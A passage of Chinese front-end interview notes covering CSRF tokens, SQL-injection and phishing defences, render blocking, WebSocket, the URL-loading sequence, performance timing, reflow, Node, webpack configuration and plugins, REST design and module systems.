另一种方式，就是在用访问的页面中，都种下验证用的token，用户所有的提交都必须带上本次页面中生成的token，这种方式的本质和使用验证码没什么两样，但是这种方式，整个页面每一次的session，使用同一个token就行，很多post操作，开发者就可以自动带上当前页面的token。如果token校验不通过，则证明此次提交并非从本站发送来，则终止提交过程。如果token确实为本网站生成的话，则可以通过。

* SQL 注入：

就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。

总的来说有以下几点：

1.永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双"-"进行转换等。

2.永远不要使用动态拼装SQL，可以使用参数化的SQL或者直接使用存储过程进行数据查询存取。

3.永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。

4.不要把机密信息明文存放，请加密或者hash掉密码和敏感的信息。

一些其他攻击：

**网络劫持攻击**

很多的时候，我们的网站不是直接就访问到我们的服务器上的，中间会经过很多层代理，如果在某一个环节，数据被中间代理层的劫持者所截获，他们就能获取到使用你网站的用户的密码等保密数据。比如，我们的用户经常会在各种饭馆里面，连一些奇奇怪怪的wifi，如果这个wifi是黑客所建立的热点wifi，那么黑客就可以截获该用户收发的所有数据。这里，建议站长们网站都使用https进行加密。这样，就算网站的数据能被拿到，黑客也无法解开。

如果你的网站还没有进行https加密的化，则在表单提交部分，最好进行非对称加密--即客户端加密，只有服务端能解开。这样中间的劫持者便无法获取加密内容的真实信息了。

**钓鱼**

QQ群里面有人发什么兼职啦、什么自己要去国外了房子车子甩卖了，详情在我QQ空间里啦，之类的连接。打开之后发现一个QQ登录框，其实一看域名就知道不是QQ，不过做得非常像QQ登录，不明就里的用户们，就真的把用户名和密码输入了进去，结果没登录到QQ，用户名和密码却给人发过去了。

这种钓鱼方式比较有意思，重点在于我们比较难防住这种攻击，我们并不能将所有的页面链接都使用js打开。所以，要么就将外链跳转的连接改为当前页面跳转，要么就在页面unload的时候给用户加以提示，要么就将页面所有的跳转均改为window.open，在打开时，跟大多数钓鱼防治殊途同归的一点是，我们需要网民们的安全意识提高。

### 8.哪些地方会出现 css 阻塞，及 js 阻塞

js 的阻塞特性：所有浏览器在下载 JS 的时候，会阻止一切其他活动，比如其他资源的下载，内容的呈现等等。直到 JS 下载、解析、执行完毕后才开始继续并行下载其他资源并呈现内容。为了提高用户体验，新一代浏览器都支持并行下载 JS，但是 JS 下载仍然会阻塞其它资源的下载（例如.图片，css文件等）。由于浏览器为了防止出现 JS 修改 DOM 树，需要重新构建 DOM 树的情况，所以就会阻塞其他的下载和呈现。

嵌入 JS 会阻塞所有内容的呈现，而外部 JS 只会阻塞其后内容的显示，2 种方式都会阻塞其后资源的下载。也就是说外部样式不会阻塞外部脚本的加载，但会阻塞外部脚本的执行。

当 CSS 后面跟着嵌入的 JS 的时候，该 CSS 就会出现阻塞后面资源下载的情况。而当把嵌入 JS 放到 CSS 前面，就不会出现阻塞的情况了。

根本原因：因为浏览器会维持 html 中 css 和 js 的顺序，样式表必须在嵌入的 JS 执行前先加载、解析完。而嵌入的 JS 会阻塞后面的资源加载，所以就会出现上面 CSS 阻塞下载的情况。

**手段：**

Javascript无阻塞加载具体方式：

1. 将脚本放在底部。<link>还是放在head中，用以保证在js加载前，能加载出正常显示的页面。<script>标签放在</body>前。

2. 阻塞脚本：由于每个<script>标签下载时阻塞页面解析过程，所以限制页面的<script>总数也可以改善性能。适用于内联脚本和外部脚本。

3. 非阻塞脚本：等页面完成加载后，再加载js代码。也就是，在 window.onload 事件发出后开始下载代码。

4. defer属性：支持IE4和fierfox3.5更高版本浏览器

5. 动态脚本元素：文档对象模型（DOM）允许你使用js动态创建HTML的几乎全部文档内容。代码如下：

```xml
<script>
    var script=document.createElement("script");
    script.type="text/javascript";
    script.src="file.js";
    document.getElementsByTagName("head")[0].appendChild(script);
</script>
```
此技术的重点在于：无论在何处启动下载，文件额下载和运行都不会阻塞其他页面处理过程，即使在head里（除了用于下载文件的 http 链接）。
**css 加载会阻塞 DOM 的解析或 JS 的运行吗？**

1. DOM解析和CSS解析是两个并行的进程，所以这也解释了为什么CSS加载不会阻塞DOM的解析。
2. 然而，由于Render Tree是依赖于DOM Tree和CSSOM Tree的，所以他必须等待到CSSOM Tree构建完成，也就是CSS资源加载完成(或者CSS资源加载失败)后，才能开始渲染。因此，CSS加载是会阻塞Dom的渲染的。
3. 由于js可能会操作之前的Dom节点和css样式，因此浏览器会维持html中css和js的顺序。因此，样式表会在后面的js执行前先加载执行完毕。所以css会阻塞后面js的执行。
### 9.WebSocket 的理解，还有什么消息推送实现手段

**Websocket:**

WebSocket是 HTML5 开始提供的一种浏览器与服务器间进行全双工通讯的网络技术。依靠这种技术可以实现客户端和服务器端的长连接，双向实时通信。

特点:

a、事件驱动 b、异步 c、使用 ws 或者 wss 协议的客户端 socket  d、能够实现真正意义上的推送功能

缺点：少部分浏览器不支持，浏览器支持的程度与方式有区别。

```javascript
var WebSocketServer = require('ws').Server;
var wss = new WebSocketServer({port: 2000});
wss.on('connection', function(ws) {
    ws.send('服务端发来一条消息');
    ws.on('message', function(message) {
        //转发一下客户端发过来的消息
        console.log('收到客户端来的消息: %s', message);
        ws.send('服务端收到来自客户端的消息:' + message);
    });
    ws.on('close', function(event) {
        console.log('客户端请求关闭',event);
    });
});

client.html
<script>
var ws = new WebSocket("ws://127.0.0.1:2000/");
document.getElementById('btn').addEventListener('click', function() {
  ws.send('cancel_order');
});
function addbox(msg){
  var box = document.createElement('div');
      box.innerHTML = msg;
  document.getElementById('boxwarp').append(box);
}
ws.onopen = function() {
    var msg = 'ws已经联接';
    addbox(msg);
    ws.send(msg);
};
ws.onmessage = function (evt) {
    console.log('evt');
    addbox(evt.data);
};
ws.onclose = function() {
   console.log('close');
   addbox('服务端关闭了ws');
};
ws.onerror = function(err) {
   addbox(err);
};
</script>
```
**HTTP协议决定了服务器与客户端之间的连接方式，无法直接实现消息推送（ F5 已坏） , 一些变相的解决办法：**
**消息推送轮询：**客户端定时向服务器发送Ajax请求，服务器接到请求后马上返回响应信息并关闭连接。

优点：后端程序编写比较容易。

缺点：请求中有大半是无用，浪费带宽和服务器资源。

实例：适于小型应用。

**长轮询：**客户端向服务器发送Ajax请求，服务器接到请求后 hold 住连接，直到有新消息才返回响应信息并关闭连接，客户端处理完响应信息后再向服务器发送新的请求。

优点：在无消息的情况下不会频繁的请求，耗费资小。

缺点：服务器hold连接会消耗资源，返回数据顺序无保证，难于管理维护。 Comet 异步的 ashx ，

实例：WebQQ、 Hi 网页版、 Facebook IM 。

**长连接：**在页面里嵌入一个隐蔵iframe，将这个隐蔵 iframe 的 src 属性设为对一个长连接的请求或是采用 xhr 请求，服务器端就能源源不断地往客户端输入数据。

优点：消息即时到达，不发无用请求；管理起来也相对便。

缺点：服务器维护一个长连接会增加开销。

实例：Gmail聊天

**Flash Socket：**在页面中内嵌入一个使用了 Socket 类的 Flash 程序 JavaScript 通过调用此 Flash 程序提供的 Socket 接口与服务器端的 Socket 接口进行通信， JavaScript 在收到服务器端传送的信息后控制页面的显示。

优点：实现真正的即时通信，而不是伪即时。

缺点：客户端必须安装Flash插件；非 HTTP 协议，无法自动穿越防火墙。

实例：网络互动游戏。

### 10.浏览器中输入一个 url 后发生了什么（变种如果用户无法打开网站从哪些地方考虑排查问题）

1. 在浏览器地址栏输入URL
2. 浏览器查看缓存，如果请求资源在缓存中并且新鲜，跳转到转码步骤
    1. 如果资源未缓存，发起新请求
    2. 如果已缓存，检验是否足够新鲜，足够新鲜直接提供给客户端，否则与服务器进行验证。
    3. 检验新鲜通常有两个HTTP头进行控制Expires和Cache-Control：
        1. HTTP1.0提供Expires，值为一个绝对时间表示缓存新鲜日期
        2. HTTP1.1增加了Cache-Control: max-age=,值为以秒为单位的最大新鲜时间
3. 浏览器解析URL获取协议，主机，端口，path
4. 浏览器组装一个HTTP（GET）请求报文
5. 浏览器获取主机ip地址，过程如下：
    1. 浏览器缓存
    2. 本机缓存
    3. hosts文件
    4. 路由器缓存
    5. ISP DNS缓存
    6. DNS递归查询（可能存在负载均衡导致每次IP不一样）
6. 打开一个socket与目标IP地址，端口建立TCP链接，三次握手如下：
    1. 客户端发送一个TCP的SYN=1，Seq=x的包到服务器端口
    2. 服务器发回SYN=1，ACK=1, ack=x+1， Seq=y的响应包
    3. 客户端发送ACK=1,ack=y+1， Seq=x+1
7. TCP链接建立后发送HTTP请求
8. 服务器接受请求并解析，将请求转发到服务程序，如虚拟主机使用HTTP Host头部判断请求的服务程序
9. 服务器检查HTTP请求头是否包含缓存验证信息如果验证缓存新鲜，返回304等对应状态码
10. 处理程序读取完整请求并准备HTTP响应，可能需要查询数据库等操作
11. 服务器将响应报文通过TCP连接发送回浏览器
12. 浏览器接收HTTP响应，然后根据情况选择关闭TCP连接或者保留重用，关闭TCP连接的四次握手如下：
    1. 主动方发送Fin=1， Ack=Z， Seq= X报文
    2. 被动方发送ACK=X+1， Seq=Z报文
    3. 被动方发送Fin=1， ACK=X， Seq=Y报文
    4. 主动方发送ACK=Y， Seq=X报文
13. 浏览器检查响应状态吗：是否为1XX，3XX， 4XX， 5XX，这些情况处理与2XX不同
14. 如果资源可缓存，进行缓存
15. 对响应进行解码（例如gzip压缩）
16. 根据资源类型决定如何处理（假设资源为HTML文档）
17. 解析HTML文档，构件DOM树，下载资源，构造CSSOM树，执行js脚本，这些操作没有严格的先后顺序，以下分别解释
18. 构建DOM树：
    1. Tokenizing：根据HTML规范将字符流解析为标记
    2. Lexing：词法分析将标记转换为对象并定义属性和规则
    3. DOM construction：根据HTML标记关系将对象组成DOM树
19. 解析过程中遇到图片、样式表、js文件，启动下载
20. 构建CSSOM树：
    1. Tokenizing：字符流转换为标记流
    2. Node：根据标记创建节点
    3. CSSOM：节点创建CSSOM树
21. 根据DOM树和CSSOM树构建渲染树:
    1. 从DOM树的根节点遍历所有可见节点，不可见节点包括：1）script,meta这样本身不可见的标签。2)被css隐藏的节点，如display: none
    2. 对每一个可见节点，找到恰当的CSSOM规则并应用
    3. 发布可视节点的内容和计算样式
22. js解析如下：
    1. 浏览器创建Document对象并解析HTML，将解析到的元素和文本节点添加到文档中，此时document.readystate为loading
    2. HTML解析器遇到没有async和defer的script时，将他们添加到文档中，然后执行行内或外部脚本。这些脚本会同步执行，并且在脚本下载和执行时解析器会暂停。这样就可以用document.write()把文本插入到输入流中。同步脚本经常简单定义函数和注册事件处理程序，他们可以遍历和操作script和他们之前的文档内容
    3. 当解析器遇到设置了async属性的script时，开始下载脚本并继续解析文档。脚本会在它下载完成后尽快执行，但是解析器不会停下来等它下载。异步脚本禁止使用document.write()，它们可以访问自己script和之前的文档元素
    4. 当文档完成解析，document.readState变成interactive
    5. 所有defer脚本会按照在文档出现的顺序执行，延迟脚本能访问完整文档树，禁止使用document.write()
    6. 浏览器在Document对象上触发DOMContentLoaded事件
    7. 此时文档完全解析完成，浏览器可能还在等待如图片等内容加载，等这些内容完成载入并且所有异步脚本完成载入和执行，document.readState变为complete,window触发load事件
23. 显示页面（HTML解析过程中会逐步显示页面）
### 11、web性能如何评估

![图片](https://uploader.shimo.im/f/Cld3syTng8S75Haj.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

**window.performance 性能统计**

performance的结构：

* memory 显示此刻内存占用情况，它是一个动态值，usedJSHeapSize、totalJSHeapSize、jsHeapSizeLimit
* navigation 显示页面的来源信息
* onresourcetimingbufferfull 属性是一个在resourcetimingbufferfull事件触发时会被调用的 event handler
* timeOrigin 是一系列时间点的基准点，精确到万分之一毫秒。
* timing 一系列关键时间点，它包含了网络、解析等一系列的时间数据。
```plain
// 同一个浏览器上一个页面卸载(unload)结束时的时间戳。如果没有上一个页面，这个值会和fetchStart相同。
navigationStart: 1543806782096,
// 返回浏览器向服务器发出HTTP请求时（或开始读取本地缓存时）的时间戳。
requestStart: 1543806782241,
// 返回浏览器从服务器收到（或从本地缓存读取）第一个字节时的时间戳。
//如果传输层在开始请求之后失败并且连接被重开，该属性将会被数制成新的请求的相对应的发起时间。
responseStart: 1543806782516,
```
重定向耗时：redirectEnd - redirectStart
DNS查询耗时 ：domainLookupEnd - domainLookupStart

TCP链接耗时 ：connectEnd - connectStart

HTTP请求耗时 ：responseEnd - responseStart

解析dom树耗时 ： domComplete - domInteractive

白屏时间 ：responseStart - navigationStart

DOMready时间 ：domContentLoadedEventEnd - navigationStart

onload时间：loadEventEnd - navigationStart，也即是onload回调函数执行的时间。


### 12、**如何优化你的脚本来减少reflow/repaint?**

1. 避免在document上直接进行频繁的DOM操作，如果确实需要可以采用off-document的方式进行，具体的方法包括但不完全包括以下几种：

(1). 先将元素从document中删除，完成修改后再把元素放回原来的位置

(2). 将元素的display设置为”none”，完成修改后再把display修改为原来的值

(3). 如果需要创建多个DOM节点，可以使用DocumentFragment创建完后一次性的加入document

2. 集中修改样式

(1). 尽可能少的修改元素style上的属性

(2). 尽量通过修改className来修改样式

(3). 通过cssText属性来设置样式值

3. 缓存Layout属性值

对于Layout属性中非引用类型的值（数字型），如果需要多次访问则可以在一次访问时先存储到局部变量中，之后都使用局部变量，这样可以避免每次读取属性时造成浏览器的渲染。

4. 设置元素的position为absolute或fixed

在元素的position为static和relative时，元素处于DOM树结构当中，当对元素的某个操作需要重新渲染时，浏览器会渲染整个页面。将元素的position设置为absolute和fixed可以使元素从DOM树结构中脱离出来独立的存在，而浏览器在需要渲染时只需要渲染该元素以及位于该元素下方的元素，从而在某种程度上缩短浏览器渲染时间，这在当今越来越多的Javascript动画方面尤其值得考虑。

* 最小化重绘和重排 ： 为了减少发生次数，我们可以合并多次对DOM和样式的修改，然后一次处理掉。(使用cssText、修改CSS的class)
* 批量修改DOM：1.使元素脱离文档流；2.对其进行多次修改；3.将元素带回到文档中。（有三种方式可以让DOM脱离文档流：隐藏元素，应用修改，重新显示；使用文档片段(document fragment)在当前DOM之外构建一个子树，再把它拷贝回文档。；将原始元素拷贝到一个脱离文档的节点中，修改节点后，再替换原始的元素。）
* 避免触发同步布局事件：当我们访问元素的一些属性的时候，会导致浏览器强制清空队列，进行强制同步布局。
* 对于复杂动画效果,使用绝对定位让其脱离文档流。
* css3硬件加速（GPU加速）（使用css3硬件加速，可以让transform、opacity、filters这些动画不会引起回流重绘 。但是对于动画的其它属性，比如background-color这些，还是会引起回流重绘的，不过它还是可以提升这些动画的性能。）（缺点：如果你为太多元素使用css3硬件加速，会导致内存占用较大，会有性能问题。在GPU渲染字体会导致抗锯齿无效。这是因为GPU和CPU的算法不同。因此如果你不在动画结束的时候关闭硬件加速，会产生字体模糊。）

**浏览器的优化机制**:

现代的浏览器都是很聪明的，由于每次重排都会造成额外的计算消耗，因此大多数浏览器都会通过队列化修改并批量执行来优化重排过程。浏览器会将修改操作放入到队列里，直到过了一段时间或者操作达到了一个阈值，才清空队列。但是！当你**获取布局信息的操作的时候**，会强制队列刷新，比如当你访问以下属性或者使用以下方法：

offsetTop、offsetLeft、offsetWidth、offsetHeight

scrollTop、scrollLeft、scrollWidth、scrollHeight

clientTop、clientLeft、clientWidth、clientHeight

getComputedStyle()

getBoundingClientRect

以上属性和方法都需要返回最新的布局信息，因此浏览器不得不清空队列，触发回流重绘来返回正确的值。因此，我们在修改样式的时候，**最好避免使用上面列出的属性，他们都会刷新渲染队列。**如果要使用它们，最好将值缓存起来。


## 四.Node

### 1.对 Node 的优缺点提出自己的看法

**特点：**

它是一个Javascript运行环境，依赖于Chrome V8引擎进行代码解释

异步事件驱动，非阻塞I/O

轻量、可伸缩，适于实时数据交互应用，单线程（这里指主线程），性能出众

**优点**：

    * 高效节约成本，客户端和服务器端都用同一种语言编写
    * 因为Node是基于事件驱动和无阻塞的，所以非常适合处理高并发请求
    * 基于 v8 引擎，在V8 JavaScript引擎内部使用一种全新的编译技术。这意味着开发者编写的高端的 JavaScript 脚本代码与开发者编写的低端的C语言具有非常相近的执行效率

**缺点**：

    * 不适合CPU密集型应用；CPU密集型应用给Node带来的挑战主要是：由于JavaScript单线程的原因，如果有长时间运行的计算（比如大循环），将会导致CPU时间片不能释放，使得后续I/O无法发起；`解决方案：分解大型运算任务为多个小任务，使得运算能够适时释放，不阻塞I/O调用的发起；`
    * 只支持单核CPU，不能充分利用CPU
    * 可靠性低，一旦代码某个环节崩溃，整个系统都崩溃    原因：单进程，单线程`解决方案：（1）Nnigx反向代理，负载均衡，开多个进程，绑定多个端口；2）开多个进程监听同一个端口，使用cluster模块；`
    * 开源组件库质量参差不齐，更新快，向下不兼容
    * Debug不方便，错误没有stack trace，出错时调用栈不完整



### 2.webpack 的理解，为什么要做三份配置文件、打包后的文件、打包优化

* 用过哪些loader和plugin
* loader的执行顺序为什么是后写的先执行
* webpack配置优化
* webpack打包优化（happypack、dll
* plugin与loader的区别
* webpack执行的过程
* 如何编写一个loader、plugin
* tree-shaking作用，如何才能生效
* 开发环境与生产环境的区别

开发环境

* **NODE_ENV**为**development**
* 启用模块热更新（hot module replacement）
* 额外的 webpack-dev-server 配置项，API Proxy 配置项
* 输出 Sourcemap

生产环境

* **NODE_ENV**为**production**
* 将 React、jQuery 等常用库设置为 external，直接采用 CDN 线上的版本
* 样式源文件（如 css、less、scss 等）需要通过 ExtractTextPlugin 独立抽取成 css 文件
* 启用 post-css
* 启用 optimize-minimize（如 uglify 等）
* 中大型的商业网站生产环境下，是绝对不能有 console.log() 的，所以要为 babel 配置[Remove console transform](http://link.zhihu.com/?target=https://babeljs.io/docs/plugins/transform-remove-console/&fileGuid=6vX3hWyqpyWTRwHj)

**1. webpack.base.config.js**

在 base 文件里，你需要将开发环境和生产环境中通用的配置集中放在这里：

**2. webpack.dev.config.js**

这是用于开发环境的 Webpack 配置，继承自 base：

**3. webpack.config.js**

这是用于生产环境的 webpack 配置，同样继承自 base：

* **打包后的的文件**

分析

不难看出，实际上 bundle.js 是一个立即执行函数，其参数 modules 为一个数组，包含了我们所有要打包的模块。

这个立即执行函数主要分为4个部分：

* 第一部分，定义一个对象 installModlues 来保存 Webpack 已注册的模块。

* 第二部分，定义一个函数 __webpack_require__ 来实现的模块的加载。这里是 Webpack 管理模块的核心。

* 第三部分，在 __webpack_require__ 这个函数上绑定一些属性。

* 第四部分，调用__webpack_require__函数，开始加载模块。

modules 参数分析

立即执行函数的参数 modules 是一个数组，其中数组中的每一项为一个将模块包裹起来的立即执行函数。并且将模块中的 import语句，export语句进行了转换。

__webpack_require__ 函数分析

这个函数是 Webpack 管理模块的核心。它接收一个参数 moduleId 被引入模块的 Id ，来确定要引入的模块。而模块 Id 实际上就是就是 module 这个数组的索引。

这个函数主要分为如下几个部分：

* 第一部分，判断 installModules 中是否已经注册过这个模块（installModules 的属性 moduleId 是否存在），如果注册过，直接返回已注册模块的 exports 属性（模块的输出）。

* 第二部分，如果没有注册过，则定义一个对象module（注意区别刚才立即执行函数参数 modules），并将其注册到 installModules （绑定到 installModules 的属性 moduleId 中），这个对象包含以下三个属性：

* i： 模块 ID moduleID （ id 的简写）

* l： 模块是否已注册（初始化为 false，loaded的简写）

* exprots： 模块的输出（初始化为空）

* 第三部分，执行 modlues 中 moduleId 对应的模块立即执行函数，传入三个参数：

* 刚才定义的对象 module

* 对象的 module.exports 属性（传入的时候为空）

* __webpack_require__ 函数本身（方便在模块中调用其他模块）

* 执行完立即执行函数后，除了将模块本身的逻辑执行完，也会将模块的输出绑定到 module.exports 中

* 第四部分，将 module.l 设为 true 表示已加载

* 第五部分，最后输出 module.exports 属性

`__webpack_require__ `中的绑定的属性和方法分析

* m: modules ，数组，所有的模块，即前文提到的 modules 参数

* c: cache ，对象，所有已安装的模块

* d: define ，函数，如果输出没有保存到模块的 exports 中，则使用 Object.defineProperty 将模块的输出保存到已安装模块的 export 属性中，会在模块中替换掉 export 语句。该函数包含三个参数：

* exports: 模块的 exports 属性

* name: 模块输出的代号（名字），默认为 a ，从 abcd往下排列

* getter: 函数，返回模块的输出内容

* n: 针对 non-harmony 模块的输出定义函数做一些兼容（这里我也不太理解）

* o: Object.prototype.hasOwnProperty 的 polyfill， 在 __webpack_require__.d中的判断是否这个输出是否已绑定到这个模块中用到

* p: 实际上就是配置文件中的 output.publicPath

* 打包优化

着重的就是三个东西来完成此次优化：

* webpack.optimize.CommonsChunkPlugin // 常用的提取各个包共有模块的工具
* OptimizeCssAssetsPlugin
* BundleAnalyzerPlugin

常见问题：

* 只抽离了vendor.js，却没有抽离各个入口的共有代码
* 每个入口模块的css也没有抽离出共有代码，导致500k的样式文件在每个入口的css文件里都有一份，浏览器缓存用不起来
* css文件没有压缩，去注释等优化工作，在线上直接裸奔，传输的大小过大
* 有些基础库虽然不是每个入口包都需要的，但迟早是需要的，是否也应该进一步优化出来成为一个单独的包引用，而不是打在各个入口包里

![图片](https://uploader.shimo.im/f/WYke09DdIa0iVIYo.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

我们可以看出各个包的组成，里面明显的问题：

* lodash这个库挺大的，没有抽出来
* 各个入口文件的共有代码没有提出来，例如每个入口包里都有的模块：axios、core-js等
* 这个图里没有css（这里要记录一下，我可能才刚刚理解了一切皆模块的理论，为什么会有上面提到的第二个问题，原因就在这里，公共的代码没有提取出来的时候，js和css代码都不会有的，因为他们是一体的，虽然我们后来用ExtractTextPlugin插件把css提出来成了单文件，但模块这个概念其实是广义的，模块里不仅可以有js也可以有css，甚至任何资源。）所以要把各个入口的样式都提到一个共有文件里。

配置修改：

entry: {

// ... 这里的5入口模块文件就省略了

vendor: ['vue', 'vue-router', 'vuex', 'element-ui'],

echarts: ['vue-echarts'],

lodash: ['lodash']

}

* vendor.js: 包含我们的主要技术栈模块vue, vue-router, vuex, element-ui。这些内容都是不轻易改变的，打成vendor可以很好的缓存起来，而且所有的入口文件都会用到vendor。
* echarts.js: 包含vue-echarts这个模块，没错，就是想把它单独拎出来好让浏览器缓存，我们是个后台系统，图表是常用组件，又由于这个组件特别大，600k+，所以单独成包。
* lodash.js: 是这次优化的点，常用基础款应该提出来。

然后我们就需要配置CommonsChunkPlugin这个插件去完成公共包的抽离，并且命名为**common.js**

```javascript
plugins: [  
  new webpack.DefinePlugin({
    'process.env': env,
  }),
  new webpack.optimize.UglifyJsPlugin({
    compress: {
      warnings: false
    }
  }),
  new OptimizeCssAssetsPlugin({
    assetNameRegExp: /\.css$/,
    cssProcessorOptions: { 
         discardComments: { removeAll: true } 
    }
  }),
  // extract css into its own file
  new ExtractTextPlugin({
    filename: utils.assetsPath('css/[name].[contenthash].css')
  }),
  // 抽取公共模块 
  new webpack.optimize.CommonsChunkPlugin({
    names: ['common', 'lodash', 'echarts', 'vendor'] // 依赖关系common -> lodash -> echarts -> vendor -> manifest 
  }),
  // 抽取 manifest
  new webpack.optimize.CommonsChunkPlugin({
    name: 'manifest',
    minChunks: Infinity
  })
]
```
**优化：**
* 缩小文件的搜索范围 （resolve字段告诉webpack怎么去搜索文件、配置loader时，通过test、exclude、include缩小搜索范围）
* 使用DllPlugin减少基础模块编译次数（其原理是把网页依赖的基础模块抽离出来打包到dll文件中，当需要导入的模块存在于某个dll中时，这个模块不再被打包，而是去dll中获取）（生成文件：其中xx.dll.js包含打包的n多模块，这些模块存在一个数组里，并以数组索引作为ID，通过一个变量假设为_xx_dll暴露在全局中，可以通过window._xx_dll访问这些模块。xx.manifest.json文件描述dll文件包含哪些模块、每个模块的路径和ID。然后再在项目的主config文件里使用DllReferencePlugin插件引入xx.manifest.json文件。
* 使用HappyPack开启多进程Loader转换
* 使用ParallelUglifyPlugin开启多进程压缩JS文件
* 区分环境--减小生产环境代码体积
* 压缩代码-JS、ES、CSS
* 使用Tree Shaking剔除JS死代码（它正常工作的前提是代码必须采用ES6的模块化语法，它依赖ES6的import、export的模块化语法）
* 使用CDN加速静态资源加载（HTTP1.x版本的协议下，浏览器会对于向同一域名并行发起的请求数限制在4~8个。那么把所有静态资源放在同一域名下的CDN服务上就会遇到这种限制，所以可以把他们分散放在不同的CDN服务上，例如JS文件放在js.cdn.com下，将CSS文件放在css.cdn.com下等。这样又会带来一个新的问题：增加了域名解析时间，这个可以通过dns-prefetch来解决 来缩减域名解析的时间。形如**//xx.com 这样的URL省略了协议**，这样做的好处是，浏览器在访问资源时会自动根据当前URL采用的模式来决定使用HTTP还是HTTPS协议。）
* 多页面应用提取页面间公共代码，以利用缓存
* 分割代码以按需加载
* 使用Scope Hoisting（译作“作用域提升”，是在Webpack3中推出的功能，它分析模块间的依赖关系，尽可能将被打散的模块合并到一个函数中，但不能造成代码冗余，所以只有被引用一次的模块才能被合并。由于需要分析模块间的依赖关系，所以源码必须是采用了ES6模块化的，否则Webpack会降级处理不采用Scope Hoisting。）

优化

1 按需加载：路由组件按需加载、按需引入第三方插件

2 优化loader配置：优化正则匹配、通过 cacheDirectory 选项开启缓存、通过include、exclude减少被处理文件范围

3 优化文件路径，省下搜索查找的时间：extension配置后不用再require货import时候加文件扩展名、alias配置别名加快webpack查找模块的速度

4 生产环境关闭 sourceMap

5 代码压缩 ParallelUglifyPlugin 多进程压缩文件

6 提取公共代码commonsChunkPlugin (webpack3)、splitChunks(webpack4)

7 CDN 优化

### 3.webpack 插件怎么写，webpack loader

**webpack loaders**

* 单一职责 ： 一个 loader 只做一件事，这样不仅可以让 loader 的维护变得简单，还能让 loader 以不同的串联方式组合出符合场景需求的搭配。
* 链式组合： 一般我们会将多个 loader 串联使用，类似工厂流水线，一个位置的工人（或机器）只干一种类型的活。顺序最后的 loader 第一个被调用，它拿到的参数是 source 的内容。顺序第一的 loader 最后被调用， webpack 期望它返回 JS 代码，source map 如前面所说是可选的返回值。

**webpack plugin**

那么符合什么样的条件能作为 webpack 插件呢？一般来说，webpack 插件有以下特点：

1. 独立的 JS 模块，暴露相应的函数
2. 函数原型上的 apply 方法会注入 compiler 对象
3. compiler 对象上挂载了相应的 webpack 事件钩子
4. 事件钩子的回调函数里能拿到编译后的 compilation 对象，如果是异步钩子还能拿到相应的 callback
```javascript
// 函数的原型上为什么要定义 apply 方法？
const webpack = (options, callback) => {
  ...
  for (const plugin of options.plugins) {
    plugin.apply(compiler);
  }
  ...
}
```
**compiler**对象中包含了所有 webpack 可配置的内容，开发插件时，我们可以从 compiler 对象中拿到所有和 webpack 主环境相关的内容。
**compilation**对象代表了一次单一的版本构建和生成资源。当运行 webpack 时，每当检测到一个文件变化，一次新的编译将被创建，从而生成一组新的编译资源（编译资源是 webpack 通过配置生成的一份静态资源管理 Map（一切都在内存中保存），以 key-value 的形式描述一个 webpack 打包后的文件，编译资源就是这一个个 key-value 组成的 Map）。一个编译对象表现了当前的模块资源、编译生成资源、变化的文件、以及被跟踪依赖的状态信息。

**Tapable**

webpack 的插件架构主要基于 Tapable 实现的，Tapable 是 webpack 项目组的一个内部库，主要是抽象了一套插件机制。Tapable 能够让我们为 javaScript 模块添加并应用插件。 它可以被其它模块继承或混合。它类似于 NodeJS 的 EventEmitter 类，专注于自定义事件的触发和操作。 除此之外, Tapable 允许你通过回调函数的参数访问事件的生产者。

**事件钩子**

|钩子|作用|参数|类型|
|:----|:----|:----|:----|
|after-plugins|设置完一组初始化插件之后|compiler|sync|
|after-resolvers|设置完 resolvers 之后|compiler|sync|
|run|在读取记录之前|compiler|async|
|compile|在创建新 compilation 之前|compilationParams|sync|
|compilation|compilation 创建完成|compilation|sync|
|emit|在生成资源并输出到目录之前|compilation|async|
|after-emit|在生成资源并输出到目录之后|compilation|async|
|done|完成编译|stats|sync|


### 4.对于 RESTful 架构的理解

综述：

* 每个 URI 代表一种资源；
* 客户端和 服务器之间，传递这种资源的某种表现层
* 客户端通过四个HTTP动词，对服务器端资源进行操作，实现"表现层状态转化"。

规范：

* 协议：API 与用户的通信协议，总是使用HTTPs协议
* 域名：应该尽量将API部署在专用域名之下`https://api.example.com`
* 版本：应该将API的版本号放入URL`https://api.example.com/v1/`
* 路径：路径又称"终点"（endpoint），表示API的具体网址。在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词，而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的"集合"（collection），所以API中的名词也应该使用复数。



举例来说，有一个API提供动物园（zoo）的信息，还包括各种动物和雇员的信息，则它的路径应该设计成下面这样。

*[https://api.example.com/v1/zoos](https://api.example.com/v1/zoos?fileGuid=6vX3hWyqpyWTRwHj)

*[https://api.example.com/v1/animals](https://api.example.com/v1/animals?fileGuid=6vX3hWyqpyWTRwHj)

*[https://api.example.com/v1/employees](https://api.example.com/v1/employees?fileGuid=6vX3hWyqpyWTRwHj)

* HTTP 动词 ：GET 、POST、PUT、PATCH、DELETE
* 过滤信息：如果记录数量很多，服务器不可能都将它们返回给用户。API应该提供参数，过滤返回结果。

* ?limit=10：指定返回记录的数量

* ?offset=10：指定返回记录的开始位置。

* ?page=2&per_page=100：指定第几页，以及每页的记录数。

* ?sortby=name&order=asc：指定返回结果按照哪个属性排序，以及排序顺序。

* ?animal_type_id=1：指定筛选条件

* 状态码：服务器向用户返回的状态码和提示信息
* 错误处理
* 返回结果
### 5.前端模块化有哪些方式

前端模块规范有三种：CommonJs, AMD和 CMD。

CommonJs用在服务器端，AMD和CMD用在浏览器环境

AMD 是 RequireJS 在推广过程中对模块定义的规范化产出。

CMD 是 SeaJS 在推广过程中对模块定义的规范化产出。

AMD:提前执行（异步加载：依赖先执行）+延迟执行

CMD:延迟执行（运行到需加载，根据顺序执行）

AMD是依赖关系前置,在定义模块的时候就要声明其依赖的模块;

CMD是按需加载依赖就近,只有在用到某个模块的时候再去require：



* 函数写法

模块就是实现特定功能的文件，把几个函数放在一个文件里就构成了一个模块，需要的时候加载这个文件，调用其中的函数即可。但这样做会污染全局变量，无法保证不与其他模块发生变量名冲突，而且模块成员之间没什么关系。

